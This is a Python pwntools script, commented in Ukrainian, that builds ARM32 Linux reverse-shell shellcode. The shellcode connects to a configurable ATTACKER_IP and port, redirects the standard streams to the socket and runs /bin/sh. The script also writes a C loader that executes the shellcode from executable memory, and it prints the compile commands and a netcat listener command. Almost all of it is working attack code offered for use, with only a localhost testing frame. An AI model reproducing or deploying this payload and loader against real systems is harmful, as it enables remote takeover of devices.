#!/usr/bin/env python3
from pwn import *
context.arch = 'arm'
context.bits = 32
context.os = 'linux'
context.endian = 'little'

# Налаштовувані параметри
ATTACKER_IP = "127.0.0.1"  # IP-адреса атакуючої машини
ATTACKER_PORT = 4444       # Порт на атакуючій машині

# Конвертація IP у формат для використання в коді
ip_bytes = bytes(map(int, ATTACKER_IP.split('.')))
ip_asm = ', '.join(f'0x{b:02x}' for b in ip_bytes)

# Конвертація порту в Network Byte Order (Big-Endian для порту)
port_hex = struct.pack(">H", ATTACKER_PORT).hex()

# Створюємо шеллкод для зворотного підключення
assembly = f"""
.arm
/* socket(2, 1, 0) */
mov r0, #2          /* AF_INET */
mov r1, #1          /* SOCK_STREAM */
mov r2, #0          /* IPPROTO_IP */
mov r7, #281        /* socket syscall для ARM */
svc #0
mov r4, r0          /* r4 = sockfd */

/* connect(sockfd, &sockaddr, 16) */
adr r1, sockaddr    /* r1 = адреса sockaddr */
mov r2, #16         /* r2 = розмір sockaddr */
mov r7, #283        /* connect syscall */
svc #0
cmp r0, #0          /* Перевіряємо, чи успішне підключення */
bne exit            /* Якщо помилка, виходимо */

/* dup2(sockfd, 0) - перенаправляємо STDIN */
mov r0, r4          /* r0 = sockfd */
mov r1, #0          /* r1 = STDIN (0) */
mov r7, #63         /* r7 = dup2 syscall */
svc #0

/* dup2(sockfd, 1) - перенаправляємо STDOUT */
mov r0, r4          /* r0 = sockfd */
mov r1, #1          /* r1 = STDOUT (1) */
mov r7, #63         /* r7 = dup2 syscall */
svc #0

/* dup2(sockfd, 2) - перенаправляємо STDERR */
mov r0, r4          /* r0 = sockfd */
mov r1, #2          /* r1 = STDERR (2) */
mov r7, #63         /* r7 = dup2 syscall */
svc #0

/* execve("/bin/sh", NULL, NULL) */
adr r0, shell_str   /* r0 = адреса "/bin/sh" */
mov r1, #0          /* r1 = NULL (немає аргументів) */
mov r2, #0          /* r2 = NULL (немає змінних середовища) */
mov r7, #11         /* r7 = execve syscall */
svc #0

exit:
/* exit(0) */
mov r0, #0          /* exit status */
mov r7, #1          /* exit syscall */
svc #0

/* Дані */
sockaddr:
.short 2            /* AF_INET (family) */
.byte 0x{port_hex[0:2]}    /* перший байт порту */
.byte 0x{port_hex[2:4]}    /* другий байт порту */
.byte {ip_asm}      /* IP адреса */
.byte 0, 0, 0, 0, 0, 0, 0, 0 /* padding */

shell_str:
.asciz "/bin/sh"
"""

# Компілюємо шеллкод
shellcode = asm(assembly)

# Виводимо результат
print("Reverse Shell Shellcode для ARM32:")
print("\nДовжина shellcode: {} байт".format(len(shellcode)))
print("\nУ шістнадцятковому форматі:")
print("\\x" + "\\x".join("{:02x}".format(c) for c in shellcode))

# Створюємо тестовий C-файл
shellcode_hex = "\\x" + "\\x".join("{:02x}".format(c) for c in shellcode)
c_code = """
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    // Reverse shell shellcode
    unsigned char shellcode[] = "%s";
    
    // Параметри для з'єднання
    const char* target_ip = "%s";
    int target_port = %d;
    
    if (argc > 1) target_ip = argv[1];
    if (argc > 2) target_port = atoi(argv[2]);
    
    printf("Довжина shellcode: %%zu байт\\n", sizeof(shellcode) - 1);
    printf("Спроба підключення до %%s:%%d...\\n", target_ip, target_port);
    
    // Виділяємо пам'ять з правами на виконання
    void *mem = mmap(NULL, sizeof(shellcode),
                   PROT_READ | PROT_WRITE | PROT_EXEC,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    
    if (mem == MAP_FAILED) {
        perror("mmap");
        return 1;
    }
    
    // Копіюємо shellcode у виділену пам'ять
    memcpy(mem, shellcode, sizeof(shellcode));
    
    printf("Виконання shellcode...\\n");
    
    // Виконуємо shellcode
    ((void(*)())mem)();
    
    // Звільняємо пам'ять (до цього рядка ми не дійдемо, якщо execve успішний)
    munmap(mem, sizeof(shellcode));
    return 0;
}
""" % (shellcode_hex, ATTACKER_IP, ATTACKER_PORT)

# Записуємо C код у файл
with open("reverse_shell.c", "w") as f:
    f.write(c_code)

print("\nСтворено файл reverse_shell.c для тестування shellcode")
print("Компілюйте його за допомогою:")
print("arm-linux-gnueabihf-gcc -o reverse_shell reverse_shell.c")
print("qemu-arm -L /usr/arm-linux-gnueabihf ./reverse_shell")

# Інструкції з налаштування сервера для тестування
print("\nДля тестування налаштуйте netcat слухач:")
print(f"1. На машині з IP {ATTACKER_IP} запустіть:")
print(f"  nc -lvnp {ATTACKER_PORT}")
print("2. В іншому терміналі запустіть програму reverse_shell")
print("3. Після виконання шеллкоду ви отримаєте shell у вікні netcat")